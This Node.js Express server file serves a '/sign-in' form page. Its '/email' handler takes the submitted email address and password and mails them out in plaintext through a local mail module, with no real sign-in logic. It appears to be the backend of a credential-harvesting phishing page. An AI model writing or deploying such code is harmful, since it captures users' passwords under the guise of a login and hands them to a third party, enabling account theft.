const express = require('express')
const path = require('path');
const app = express()
const PORT = process.env.PORT || 8080
const sendMail = require('./mail')


app.use(express.urlencoded({
    extended: false
}))
app.use(express.json())

app.get('/', (req,res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'))
})

app.get('/sign-in', (req,res) => {
    res.sendFile(path.join(__dirname, 'views', 'form.html'))
})

app.post('/email', (req,res) => {
    const{email, password, passwordConfirm} = req.body 
    const message = `Email: ${email}, Password: ${password}`
    sendMail( message , function (err,data) {
        if (err) {
            res.status(500).json({message:'Internal server error'})
            console.log(err)
        } else {
            res.json({message: 'Email sent'})
            console.log('email sent')
        }

    })
})

app.listen(PORT, ()=> console.log('Server  is running and listening'))
